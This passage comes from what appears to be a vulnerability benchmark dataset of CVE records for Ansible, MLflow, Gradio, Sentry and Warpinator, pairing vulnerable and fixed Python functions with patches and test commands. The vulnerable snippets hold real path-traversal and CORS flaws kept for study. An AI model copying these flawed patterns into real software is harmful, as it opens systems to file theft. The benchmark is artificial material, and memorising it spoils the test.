to_native(member.name)\n                                n_archive_parent_dir = to_native(archive_parent_dir)\n                                n_parts = n_member_name.replace(n_archive_parent_dir, \"\", 1).split(os.sep)\n                                n_final_parts = []\n                                for n_part in n_parts:\n                                    # TODO if the condition triggers it produces a broken installation.\n                                    # It will create the parent directory as an empty file and will\n                                    # explode if the directory contains valid files.\n                                    # Leaving this as is since the whole module needs a rewrite.\n                                    if n_part != '..' and not n_part.startswith('~') and '$' not in n_part:\n                                        n_final_parts.append(n_part)\n                                member.name = os.path.join(*n_final_parts)\n\n                                if _check_working_data_filter():\n                                    # deprecated: description='extract fallback without filter' python_version='3.11'\n                                    role_tar_file.extract(member, to_native(self.path), filter='data')  # type: ignore[call-arg]\n                                else:\n                                    role_tar_file.extract(member, to_native(self.path))\n\n                        # write out the install info file for later use\n                        self._write_galaxy_install_info()\n                        break\n                    except OSError as e:\n                        if e.errno == errno.EACCES and idx < paths_len - 1:\n                            continue\n                        raise AnsibleError(\"Could not update files in %s: %s\" % (self.path, to_native(e)))\n\n                # return the parsed yaml metadata\n                display.display(\"- %s was installed successfully\" % str(self))\n                if not (self.src and os.path.isfile(self.src)):\n                    try:\n                        os.unlink(tmp_file)\n                    except (OSError, IOError) as e:\n                        display.warning(u\"Unable to remove tmp file (%s): %s\" % (tmp_file, to_text(e)))\n                return True\n\n        return False"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_364_1",
        "commit": "1e930684bc0a76ec3d094cd326738ad26416541c",
        "file_path": "lib/ansible/galaxy/role.py",
        "start_line": 272,
        "end_line": 451,
        "snippet": "    def install(self):\n\n        if self.scm:\n            # create tar file from scm url\n            tmp_file = RoleRequirement.scm_archive_role(keep_scm_meta=context.CLIARGS['keep_scm_meta'], **self.spec)\n        elif self.src:\n            if os.path.isfile(self.src):\n                tmp_file = self.src\n            elif '://' in self.src:\n                role_data = self.src\n                tmp_file = self.fetch(role_data)\n            else:\n                role_data = self.api.lookup_role_by_name(self.src)\n                if not role_data:\n                    raise AnsibleError(\"- sorry, %s was not found on %s.\" % (self.src, self.api.api_server))\n\n                if role_data.get('role_type') == 'APP':\n                    # Container Role\n                    display.warning(\"%s is a Container App role, and should only be installed using Ansible \"\n                                    \"Container\" % self.name)\n\n                role_versions = self.api.fetch_role_related('versions', role_data['id'])\n                if not self.version:\n                    # convert the version names to LooseVersion objects\n                    # and sort them to get the latest version. If there\n                    # are no versions in the list, we'll grab the head\n                    # of the master branch\n                    if len(role_versions) > 0:\n                        loose_versions = [LooseVersion(a.get('name', None)) for a in role_versions]\n                        try:\n                            loose_versions.sort()\n                        except TypeError:\n                            raise AnsibleError(\n                                'Unable to compare role versions (%s) to determine the most recent version due to incompatible version formats. '\n                                'Please contact the role author to resolve versioning conflicts, or specify an explicit role version to '\n                                'install.' % ', '.join([v.vstring for v in loose_versions])\n                            )\n                        self.version = to_text(loose_versions[-1])\n                    elif role_data.get('github_branch', None):\n                        self.version = role_data['github_branch']\n                    else:\n                        self.version = 'master'\n                elif self.version != 'master':\n                    if role_versions and to_text(self.version) not in [a.get('name', None) for a in role_versions]:\n                        raise AnsibleError(\"- the specified version (%s) of %s was not found in the list of available versions (%s).\" % (self.version,\n                                                                                                                                         self.name,\n                                                                                                                                         role_versions))\n\n                # check if there's a source link/url for our role_version\n                for role_version in role_versions:\n                    if role_version['name'] == self.version and 'source' in role_version:\n                        self.src = role_version['source']\n                    if role_version['name'] == self.version and 'download_url' in role_version:\n                        self.download_url = role_version['download_url']\n\n                tmp_file = self.fetch(role_data)\n\n        else:\n            raise AnsibleError(\"No valid role data found\")\n\n        if tmp_file:\n\n            display.debug(\"installing from %s\" % tmp_file)\n\n            if not tarfile.is_tarfile(tmp_file):\n                raise AnsibleError(\"the downloaded file does not appear to be a valid tar archive.\")\n            else:\n                role_tar_file = tarfile.open(tmp_file, \"r\")\n                # verify the role's meta file\n                meta_file = None\n                members = role_tar_file.getmembers()\n                # next find the metadata file\n                for member in members:\n                    for meta_main in self.META_MAIN:\n                        if meta_main in member.name:\n                            # Look for parent of meta/main.yml\n                            # Due to possibility of sub roles each containing meta/main.yml\n                            # look for shortest length parent\n                            meta_parent_dir = os.path.dirname(os.path.dirname(member.name))\n                            if not meta_file:\n                                archive_parent_dir = meta_parent_dir\n                                meta_file = member\n                            else:\n                                if len(meta_parent_dir) < len(archive_parent_dir):\n                                    archive_parent_dir = meta_parent_dir\n                                    meta_file = member\n                if not meta_file:\n                    raise AnsibleError(\"this role does not appear to have a meta/main.yml file.\")\n                else:\n                    try:\n                        self._metadata = yaml_load(role_tar_file.extractfile(meta_file))\n                    except Exception:\n                        raise AnsibleError(\"this role does not appear to have a valid meta/main.yml file.\")\n\n                paths = self.paths\n                if self.path != paths[0]:\n                    # path can be passed though __init__\n                    # FIXME should this be done in __init__?\n                    paths[:0] = self.path\n                paths_len = len(paths)\n                for idx, path in enumerate(paths):\n                    self.path = path\n                    display.display(\"- extracting %s to %s\" % (self.name, self.path))\n                    try:\n                        if os.path.exists(self.path):\n                            if not os.path.isdir(self.path):\n                                raise AnsibleError(\"the specified roles path exists and is not a directory.\")\n                            elif not context.CLIARGS.get(\"force\", False):\n                                raise AnsibleError(\"the specified role %s appears to already exist. Use --force to replace it.\" % self.name)\n                            else:\n                                # using --force, remove the old path\n                                if not self.remove():\n                                    raise AnsibleError(\"%s doesn't appear to contain a role.\\n  please remove this directory manually if you really \"\n                                                       \"want to put the role here.\" % self.path)\n                        else:\n                            os.makedirs(self.path)\n\n                        # We strip off any higher-level directories for all of the files\n                        # contained within the tar file here. The default is 'github_repo-target'.\n                        # Gerrit instances, on the other hand, does not have a parent directory at all.\n                        for member in members:\n                            # we only extract files, and remove any relative path\n                            # bits that might be in the file for security purposes\n                            # and drop any containing directory, as mentioned above\n                            if member.isreg() or member.issym():\n                                for attr in ('name', 'linkname'):\n                                    attr_value = getattr(member, attr, None)\n                                    if not attr_value:\n                                        continue\n                                    n_attr_value = to_native(attr_value)\n                                    n_archive_parent_dir = to_native(archive_parent_dir)\n                                    n_parts = n_attr_value.replace(n_archive_parent_dir, \"\", 1).split(os.sep)\n                                    n_final_parts = []\n                                    for n_part in n_parts:\n                                        # TODO if the condition triggers it produces a broken installation.\n                                        # It will create the parent directory as an empty file and will\n                                        # explode if the directory contains valid files.\n                                        # Leaving this as is since the whole module needs a rewrite.\n                                        #\n                                        # Check if we have any files with illegal names,\n                                        # and display a warning if so. This could help users\n                                        # to debug a broken installation.\n                                        if not n_part:\n                                            continue\n                                        if n_part == '..':\n                                            display.warning(f\"Illegal filename '{n_part}': '..' is not allowed\")\n                                            continue\n                                        if n_part.startswith('~'):\n                                            display.warning(f\"Illegal filename '{n_part}': names cannot start with '~'\")\n                                            continue\n                                        if '$' in n_part:\n                                            display.warning(f\"Illegal filename '{n_part}': names cannot contain '$'\")\n                                            continue\n                                        n_final_parts.append(n_part)\n                                    setattr(member, attr, os.path.join(*n_final_parts))\n\n                                if _check_working_data_filter():\n                                    # deprecated: description='extract fallback without filter' python_version='3.11'\n                                    role_tar_file.extract(member, to_native(self.path), filter='data')  # type: ignore[call-arg]\n                                else:\n                                    role_tar_file.extract(member, to_native(self.path))\n\n                        # write out the install info file for later use\n                        self._write_galaxy_install_info()\n                        break\n                    except OSError as e:\n                        if e.errno == errno.EACCES and idx < paths_len - 1:\n                            continue\n                        raise AnsibleError(\"Could not update files in %s: %s\" % (self.path, to_native(e)))\n\n                # return the parsed yaml metadata\n                display.display(\"- %s was installed successfully\" % str(self))\n                if not (self.src and os.path.isfile(self.src)):\n                    try:\n                        os.unlink(tmp_file)\n                    except (OSError, IOError) as e:\n                        display.warning(u\"Unable to remove tmp file (%s): %s\" % (tmp_file, to_text(e)))\n                return True\n\n        return False"
      }
    ],
    "vul_patch": "--- a/lib/ansible/galaxy/role.py\n+++ b/lib/ansible/galaxy/role.py\n@@ -123,18 +123,36 @@\n                             # bits that might be in the file for security purposes\n                             # and drop any containing directory, as mentioned above\n                             if member.isreg() or member.issym():\n-                                n_member_name = to_native(member.name)\n-                                n_archive_parent_dir = to_native(archive_parent_dir)\n-                                n_parts = n_member_name.replace(n_archive_parent_dir, \"\", 1).split(os.sep)\n-                                n_final_parts = []\n-                                for n_part in n_parts:\n-                                    # TODO if the condition triggers it produces a broken installation.\n-                                    # It will create the parent directory as an empty file and will\n-                                    # explode if the directory contains valid files.\n-                                    # Leaving this as is since the whole module needs a rewrite.\n-                                    if n_part != '..' and not n_part.startswith('~') and '$' not in n_part:\n+                                for attr in ('name', 'linkname'):\n+                                    attr_value = getattr(member, attr, None)\n+                                    if not attr_value:\n+                                        continue\n+                                    n_attr_value = to_native(attr_value)\n+                                    n_archive_parent_dir = to_native(archive_parent_dir)\n+                                    n_parts = n_attr_value.replace(n_archive_parent_dir, \"\", 1).split(os.sep)\n+                                    n_final_parts = []\n+                                    for n_part in n_parts:\n+                                        # TODO if the condition triggers it produces a broken installation.\n+                                        # It will create the parent directory as an empty file and will\n+                                        # explode if the directory contains valid files.\n+                                        # Leaving this as is since the whole module needs a rewrite.\n+                                        #\n+                                        # Check if we have any files with illegal names,\n+                                        # and display a warning if so. This could help users\n+                                        # to debug a broken installation.\n+                                        if not n_part:\n+                                            continue\n+                                        if n_part == '..':\n+                                            display.warning(f\"Illegal filename '{n_part}': '..' is not allowed\")\n+                                            continue\n+                                        if n_part.startswith('~'):\n+                                            display.warning(f\"Illegal filename '{n_part}': names cannot start with '~'\")\n+                                            continue\n+                                        if '$' in n_part:\n+                                            display.warning(f\"Illegal filename '{n_part}': names cannot contain '$'\")\n+                                            continue\n                                         n_final_parts.append(n_part)\n-                                member.name = os.path.join(*n_final_parts)\n+                                    setattr(member, attr, os.path.join(*n_final_parts))\n \n                                 if _check_working_data_filter():\n                                     # deprecated: description='extract fallback without filter' python_version='3.11'\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-3848",
    "cve_description": "A path traversal vulnerability exists in mlflow/mlflow version 2.11.0, identified as a bypass for the previously addressed CVE-2023-6909. The vulnerability arises from the application's handling of artifact URLs, where a '#' character can be used to insert a path into the fragment, effectively skipping validation. This allows an attacker to construct a URL that, when processed, ignores the protocol scheme and uses the provided path for filesystem access. As a result, an attacker can read arbitrary files, including sensitive information such as SSH and cloud keys, by exploiting the way the application converts the URL into a filesystem path. The issue stems from insufficient validation of the fragment portion of the URL, leading to arbitrary file read through path traversal.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/mlflow/mlflow",
    "patch_url": [
      "https://github.com/mlflow/mlflow/commit/f8d51e21523238280ebcfdb378612afd7844eca8"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_32_1",
        "commit": "c01c02a",
        "file_path": "mlflow/server/handlers.py",
        "start_line": 589,
        "end_line": 612,
        "snippet": "def _create_experiment():\n    request_message = _get_request_message(\n        CreateExperiment(),\n        schema={\n            \"name\": [_assert_required, _assert_string],\n            \"artifact_location\": [_assert_string],\n            \"tags\": [_assert_array],\n        },\n    )\n\n    tags = [ExperimentTag(tag.key, tag.value) for tag in request_message.tags]\n\n    # Validate query string in artifact location to prevent attacks\n    parsed_artifact_locaion = urllib.parse.urlparse(request_message.artifact_location)\n    validate_query_string(parsed_artifact_locaion.query)\n\n    experiment_id = _get_tracking_store().create_experiment(\n        request_message.name, request_message.artifact_location, tags\n    )\n    response_message = CreateExperiment.Response()\n    response_message.experiment_id = experiment_id\n    response = Response(mimetype=\"application/json\")\n    response.set_data(message_to_json(response_message))\n    return response"
      },
      {
        "id": "vul_py_32_2",
        "commit": "c01c02a",
        "file_path": "mlflow/server/handlers.py",
        "start_line": 1723,
        "end_line": 1742,
        "snippet": "def _validate_source(source: str, run_id: str) -> None:\n    if is_local_uri(source):\n        if run_id:\n            store = _get_tracking_store()\n            run = store.get_run(run_id)\n            source = pathlib.Path(local_file_uri_to_path(source)).resolve()\n            run_artifact_dir = pathlib.Path(local_file_uri_to_path(run.info.artifact_uri)).resolve()\n            if run_artifact_dir in [source, *source.parents]:\n                return\n\n        raise MlflowException(\n            f\"Invalid model version source: '{source}'. To use a local path as a model version \"\n            \"source, the run_id request parameter has to be specified and the local path has to be \"\n            \"contained within the artifact directory of the run specified by the run_id.\",\n            INVALID_PARAMETER_VALUE,\n        )\n\n    # Checks if relative paths are present in the source (a security threat). If any are present,\n    # raises an Exception.\n    _validate_non_local_source_contains_relative_paths(source)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_32_1",
        "commit": "f8d51e2",
        "file_path": "mlflow/server/handlers.py",
        "start_line": 589,
        "end_line": 616,
        "snippet": "def _create_experiment():\n    request_message = _get_request_message(\n        CreateExperiment(),\n        schema={\n            \"name\": [_assert_required, _assert_string],\n            \"artifact_location\": [_assert_string],\n            \"tags\": [_assert_array],\n        },\n    )\n\n    tags = [ExperimentTag(tag.key, tag.value) for tag in request_message.tags]\n\n    # Validate query string in artifact location to prevent attacks\n    parsed_artifact_locaion = urllib.parse.urlparse(request_message.artifact_location)\n    if parsed_artifact_locaion.fragment:\n        raise MlflowException(\n            \"'artifact_location' URL can't include fragment part.\",\n            error_code=INVALID_PARAMETER_VALUE,\n        )\n    validate_query_string(parsed_artifact_locaion.query)\n    experiment_id = _get_tracking_store().create_experiment(\n        request_message.name, request_message.artifact_location, tags\n    )\n    response_message = CreateExperiment.Response()\n    response_message.experiment_id = experiment_id\n    response = Response(mimetype=\"application/json\")\n    response.set_data(message_to_json(response_message))\n    return response"
      },
      {
        "id": "fix_py_32_2",
        "commit": "f8d51e2",
        "file_path": "mlflow/server/handlers.py",
        "start_line": 1727,
        "end_line": 1749,
        "snippet": "def _validate_source(source: str, run_id: str) -> None:\n    if is_local_uri(source):\n        if run_id:\n            store = _get_tracking_store()\n            run = store.get_run(run_id)\n            source = pathlib.Path(local_file_uri_to_path(source)).resolve()\n            if is_local_uri(run.info.artifact_uri):\n                run_artifact_dir = pathlib.Path(\n                    local_file_uri_to_path(run.info.artifact_uri)\n                ).resolve()\n                if run_artifact_dir in [source, *source.parents]:\n                    return\n\n        raise MlflowException(\n            f\"Invalid model version source: '{source}'. To use a local path as a model version \"\n            \"source, the run_id request parameter has to be specified and the local path has to be \"\n            \"contained within the artifact directory of the run specified by the run_id.\",\n            INVALID_PARAMETER_VALUE,\n        )\n\n    # Checks if relative paths are present in the source (a security threat). If any are present,\n    # raises an Exception.\n    _validate_non_local_source_contains_relative_paths(source)"
      }
    ],
    "vul_patch": "--- a/mlflow/server/handlers.py\n+++ b/mlflow/server/handlers.py\n@@ -12,8 +12,12 @@\n \n     # Validate query string in artifact location to prevent attacks\n     parsed_artifact_locaion = urllib.parse.urlparse(request_message.artifact_location)\n+    if parsed_artifact_locaion.fragment:\n+        raise MlflowException(\n+            \"'artifact_location' URL can't include fragment part.\",\n+            error_code=INVALID_PARAMETER_VALUE,\n+        )\n     validate_query_string(parsed_artifact_locaion.query)\n-\n     experiment_id = _get_tracking_store().create_experiment(\n         request_message.name, request_message.artifact_location, tags\n     )\n\n--- a/mlflow/server/handlers.py\n+++ b/mlflow/server/handlers.py\n@@ -4,9 +4,12 @@\n             store = _get_tracking_store()\n             run = store.get_run(run_id)\n             source = pathlib.Path(local_file_uri_to_path(source)).resolve()\n-            run_artifact_dir = pathlib.Path(local_file_uri_to_path(run.info.artifact_uri)).resolve()\n-            if run_artifact_dir in [source, *source.parents]:\n-                return\n+            if is_local_uri(run.info.artifact_uri):\n+                run_artifact_dir = pathlib.Path(\n+                    local_file_uri_to_path(run.info.artifact_uri)\n+                ).resolve()\n+                if run_artifact_dir in [source, *source.parents]:\n+                    return\n \n         raise MlflowException(\n             f\"Invalid model version source: '{source}'. To use a local path as a model version \"\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-3848:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/mlflow\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2024-3848/bin/python -m pytest tests/server/test_handlers.py::test_local_file_read_write_by_pass_vulnerability -p no:warning --disable-warnings\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-3848:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/mlflow\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2024-3848/bin/python -m pytest tests/server/test_handlers.py -k \"not test_mlflow_server_with_installed_plugin\" -p no:warning --disable-warnings "
  },
  {
    "cve_id": "CVE-2023-51449",
    "cve_description": "Gradio is an open-source Python package that allows you to quickly build a demo or web application for your machine learning model, API, or any arbitary Python function. Versions of `gradio` prior to 4.11.0 contained a vulnerability in the `/file` route which made them susceptible to file traversal attacks in which an attacker could access arbitrary files on a machine running a Gradio app with a public URL (e.g. if the demo was created with `share=True`, or on Hugging Face Spaces) if they knew the path of files to look for. This issue has been patched in version 4.11.0.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/gradio-app/gradio",
    "patch_url": [
      "https://github.com/gradio-app/gradio/commit/7ba8c5da45b004edd12c0460be9222f5b5f5f055",
      "https://github.com/gradio-app/gradio/commit/1b9d4234d6c25ef250d882c7b90e1f4039ed2d76"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_282_1",
        "commit": "dc131b6",
        "file_path": "gradio/routes.py",
        "start_line": 434,
        "end_line": 484,
        "snippet": "        async def file(path_or_url: str, request: fastapi.Request):\n            blocks = app.get_blocks()\n            if utils.validate_url(path_or_url):\n                return RedirectResponse(\n                    url=path_or_url, status_code=status.HTTP_302_FOUND\n                )\n            abs_path = utils.abspath(path_or_url)\n\n            in_blocklist = any(\n                utils.is_in_or_equal(abs_path, blocked_path)\n                for blocked_path in blocks.blocked_paths\n            )\n            is_dir = abs_path.is_dir()\n\n            if in_blocklist or is_dir:\n                raise HTTPException(403, f\"File not allowed: {path_or_url}.\")\n\n            created_by_app = str(abs_path) in set().union(*blocks.temp_file_sets)\n            in_allowlist = any(\n                utils.is_in_or_equal(abs_path, allowed_path)\n                for allowed_path in blocks.allowed_paths\n            )\n            was_uploaded = utils.is_in_or_equal(abs_path, app.uploaded_file_dir)\n            is_cached_example = utils.is_in_or_equal(\n                abs_path, utils.abspath(CACHED_FOLDER)\n            )\n\n            if not (\n                created_by_app or in_allowlist or was_uploaded or is_cached_example\n            ):\n                raise HTTPException(403, f\"File not allowed: {path_or_url}.\")\n\n            if not abs_path.exists():\n                raise HTTPException(404, f\"File not found: {path_or_url}.\")\n\n            range_val = request.headers.get(\"Range\", \"\").strip()\n            if range_val.startswith(\"bytes=\") and \"-\" in range_val:\n                range_val = range_val[6:]\n                start, end = range_val.split(\"-\")\n                if start.isnumeric() and end.isnumeric():\n                    start = int(start)\n                    end = int(end)\n                    response = ranged_response.RangedFileResponse(\n                        abs_path,\n                        ranged_response.OpenRange(start, end),\n                        dict(request.headers),\n                        stat_result=os.stat(abs_path),\n                    )\n                    return response\n\n            return FileResponse(abs_path, headers={\"Accept-Ranges\": \"bytes\"})"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_282_1",
        "commit": "7ba8c5da45b004edd12c0460be9222f5b5f5f055",
        "file_path": "gradio/routes.py",
        "start_line": 434,
        "end_line": 484,
        "snippet": "        async def file(path_or_url: str, request: fastapi.Request):\n            blocks = app.get_blocks()\n            if client_utils.is_http_url_like(path_or_url):\n                return RedirectResponse(\n                    url=path_or_url, status_code=status.HTTP_302_FOUND\n                )\n            abs_path = utils.abspath(path_or_url)\n\n            in_blocklist = any(\n                utils.is_in_or_equal(abs_path, blocked_path)\n                for blocked_path in blocks.blocked_paths\n            )\n            is_dir = abs_path.is_dir()\n\n            if in_blocklist or is_dir:\n                raise HTTPException(403, f\"File not allowed: {path_or_url}.\")\n\n            created_by_app = str(abs_path) in set().union(*blocks.temp_file_sets)\n            in_allowlist = any(\n                utils.is_in_or_equal(abs_path, allowed_path)\n                for allowed_path in blocks.allowed_paths\n            )\n            was_uploaded = utils.is_in_or_equal(abs_path, app.uploaded_file_dir)\n            is_cached_example = utils.is_in_or_equal(\n                abs_path, utils.abspath(CACHED_FOLDER)\n            )\n\n            if not (\n                created_by_app or in_allowlist or was_uploaded or is_cached_example\n            ):\n                raise HTTPException(403, f\"File not allowed: {path_or_url}.\")\n\n            if not abs_path.exists():\n                raise HTTPException(404, f\"File not found: {path_or_url}.\")\n\n            range_val = request.headers.get(\"Range\", \"\").strip()\n            if range_val.startswith(\"bytes=\") and \"-\" in range_val:\n                range_val = range_val[6:]\n                start, end = range_val.split(\"-\")\n                if start.isnumeric() and end.isnumeric():\n                    start = int(start)\n                    end = int(end)\n                    response = ranged_response.RangedFileResponse(\n                        abs_path,\n                        ranged_response.OpenRange(start, end),\n                        dict(request.headers),\n                        stat_result=os.stat(abs_path),\n                    )\n                    return response\n\n            return FileResponse(abs_path, headers={\"Accept-Ranges\": \"bytes\"})"
      }
    ],
    "vul_patch": "--- a/gradio/routes.py\n+++ b/gradio/routes.py\n@@ -1,6 +1,6 @@\n         async def file(path_or_url: str, request: fastapi.Request):\n             blocks = app.get_blocks()\n-            if utils.validate_url(path_or_url):\n+            if client_utils.is_http_url_like(path_or_url):\n                 return RedirectResponse(\n                     url=path_or_url, status_code=status.HTTP_302_FOUND\n                 )\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-36829",
    "cve_description": "Sentry is an error tracking and performance monitoring platform. Starting in version 23.6.0 and prior to version 23.6.2, the Sentry API incorrectly returns the `access-control-allow-credentials: true` HTTP header if the `Origin` request header ends with the `system.base-hostname` option of Sentry installation. This only affects installations that have `system.base-hostname` option explicitly set, as it is empty by default. Impact is limited since recent versions of major browsers have cross-site cookie blocking enabled by default. However, this flaw could allow other multi-step attacks. The patch has been released in Sentry 23.6.2.",
    "cwe_info": {
      "CWE-697": {
        "name": "Incorrect Comparison",
        "description": "The product compares two entities in a security-relevant context, but the comparison is incorrect, which may lead to resultant weaknesses."
      }
    },
    "repo": "https://github.com/getsentry/sentry",
    "patch_url": [
      "https://github.com/getsentry/sentry/commit/ee44c6be35e5e464bc40637580f39867898acd8b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_428_1",
        "commit": "8d836ea",
        "file_path": "src/sentry/api/base.py",
        "start_line": 92,
        "end_line": 127,
        "snippet": "    def allow_cors_options_wrapper(self, request: Request, *args, **kwargs):\n        if request.method == \"OPTIONS\":\n            response = HttpResponse(status=200)\n            response[\"Access-Control-Max-Age\"] = \"3600\"  # don't ask for options again for 1 hour\n        else:\n            response = func(self, request, *args, **kwargs)\n\n        allow = \", \".join(self._allowed_methods())\n        response[\"Allow\"] = allow\n        response[\"Access-Control-Allow-Methods\"] = allow\n        response[\"Access-Control-Allow-Headers\"] = (\n            \"X-Sentry-Auth, X-Requested-With, Origin, Accept, \"\n            \"Content-Type, Authentication, Authorization, Content-Encoding, \"\n            \"sentry-trace, baggage, X-CSRFToken\"\n        )\n        response[\"Access-Control-Expose-Headers\"] = \"X-Sentry-Error, Retry-After\"\n\n        if request.META.get(\"HTTP_ORIGIN\") == \"null\":\n            origin = \"null\"  # if ORIGIN header is explicitly specified as 'null' leave it alone\n        else:\n            origin = origin_from_request(request)\n\n        if origin is None or origin == \"null\":\n            response[\"Access-Control-Allow-Origin\"] = \"*\"\n        else:\n            response[\"Access-Control-Allow-Origin\"] = origin\n\n        # If the requesting origin is a subdomain of\n        # the application's base-hostname we should allow cookies\n        # to be sent.\n        basehost = options.get(\"system.base-hostname\")\n        if basehost and origin:\n            if origin.endswith(basehost):\n                response[\"Access-Control-Allow-Credentials\"] = \"true\"\n\n        return response"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_428_1",
        "commit": "ee44c6be35e5e464bc40637580f39867898acd8b",
        "file_path": "src/sentry/api/base.py",
        "start_line": 92,
        "end_line": 127,
        "snippet": "    def allow_cors_options_wrapper(self, request: Request, *args, **kwargs):\n        if request.method == \"OPTIONS\":\n            response = HttpResponse(status=200)\n            response[\"Access-Control-Max-Age\"] = \"3600\"  # don't ask for options again for 1 hour\n        else:\n            response = func(self, request, *args, **kwargs)\n\n        allow = \", \".join(self._allowed_methods())\n        response[\"Allow\"] = allow\n        response[\"Access-Control-Allow-Methods\"] = allow\n        response[\"Access-Control-Allow-Headers\"] = (\n            \"X-Sentry-Auth, X-Requested-With, Origin, Accept, \"\n            \"Content-Type, Authentication, Authorization, Content-Encoding, \"\n            \"sentry-trace, baggage, X-CSRFToken\"\n        )\n        response[\"Access-Control-Expose-Headers\"] = \"X-Sentry-Error, Retry-After\"\n\n        if request.META.get(\"HTTP_ORIGIN\") == \"null\":\n            origin = \"null\"  # if ORIGIN header is explicitly specified as 'null' leave it alone\n        else:\n            origin = origin_from_request(request)\n\n        if origin is None or origin == \"null\":\n            response[\"Access-Control-Allow-Origin\"] = \"*\"\n        else:\n            response[\"Access-Control-Allow-Origin\"] = origin\n\n        # If the requesting origin is a subdomain of\n        # the application's base-hostname we should allow cookies\n        # to be sent.\n        basehost = options.get(\"system.base-hostname\")\n        if basehost and origin:\n            if origin.endswith((\"://\" + basehost, \".\" + basehost)):\n                response[\"Access-Control-Allow-Credentials\"] = \"true\"\n\n        return response"
      }
    ],
    "vul_patch": "--- a/src/sentry/api/base.py\n+++ b/src/sentry/api/base.py\n@@ -30,7 +30,7 @@\n         # to be sent.\n         basehost = options.get(\"system.base-hostname\")\n         if basehost and origin:\n-            if origin.endswith(basehost):\n+            if origin.endswith((\"://\" + basehost, \".\" + basehost)):\n                 response[\"Access-Control-Allow-Credentials\"] = \"true\"\n \n         return response\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-42725",
    "cve_description": "Warpinator through 1.2.14 allows access outside of an intended directory, as demonstrated by symbolic directory links.",
    "cwe_info": {
      "CWE-59": {
        "name": "Improper Link Resolution Before File Access ('Link Following')",
        "description": "The product attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource."
      }
    },
    "repo": "https://github.com/linuxmint/warpinator",
    "patch_url": [
      "https://github.com/linuxmint/warpinator/commit/5244c33d4c109ede9607b9d94461650410e2cddc"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_401_1",
        "commit": "c28609cef4765a97a85ac1d8930a10324e00454b",
        "file_path": "src/transfers.py",
        "start_line": 164,
        "end_line": 195,
        "snippet": "    def __init__(self, op):\n        super(FileReceiver, self).__init__()\n        self.save_path = prefs.get_save_path()\n        self.op = op\n        self.preserve_perms = prefs.preserve_permissions() and util.save_folder_is_native_fs()\n        self.preserve_timestamp = prefs.preserve_timestamp() and util.save_folder_is_native_fs()\n\n        self.current_path = None\n        self.current_gfile = None\n        self.current_type = None\n        self.current_stream = None\n        self.current_mode = 0\n        self.current_mtime = 0\n        self.current_mtime_usec = 0\n\n        if op.existing:\n            for name in op.top_dir_basenames:\n                try:\n                    path = os.path.join(self.save_path, name)\n                    if os.path.isdir(path): # file not found is ok\n                        shutil.rmtree(path)\n                    else:\n                        os.remove(path)\n                except FileNotFoundError:\n                    pass\n                except Exception as e:\n                    logging.warning(\"Problem removing existing files.  Transfer may not succeed: %s\" % e)\n\n        # We write files top-down.  If we're preserving permissions and we receive\n        # a folder in some hierarchy that is not writable, we won't be able to create\n        # anything inside it.\n        self.folder_permission_change_list = []"
      },
      {
        "id": "vul_py_401_2",
        "commit": "c28609cef4765a97a85ac1d8930a10324e00454b",
        "file_path": "src/transfers.py",
        "start_line": 197,
        "end_line": 225,
        "snippet": "    def receive_data(self, s):\n        save_path = prefs.get_save_path()\n\n        path = os.path.join(save_path, s.relative_path)\n        if path != self.current_path:\n            self.close_current_file()\n            self.current_path = path\n            self.current_mode = s.file_mode\n            self.current_type = s.file_type\n            self.current_mtime = s.time.mtime\n            self.current_mtime_usec = s.time.mtime_usec\n\n        if not self.current_gfile:\n            self.current_gfile = Gio.File.new_for_path(path)\n\n        if s.file_type == FileType.DIRECTORY:\n            os.makedirs(path, exist_ok=True)\n        elif s.file_type == FileType.SYMBOLIC_LINK:\n            make_symbolic_link(self.op, path, s.symlink_target)\n        else:\n            if self.current_stream == None:\n                flags = Gio.FileCreateFlags.REPLACE_DESTINATION\n                self.current_stream = self.current_gfile.replace(None, False, flags, None)\n\n            if not s.chunk:\n                return\n\n            self.current_stream.write_bytes(GLib.Bytes(s.chunk), None)\n            self.op.progress_tracker.update_progress(len(s.chunk))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_401_1",
        "commit": "5244c33d4c109ede9607b9d94461650410e2cddc",
        "file_path": "src/transfers.py",
        "start_line": 167,
        "end_line": 199,
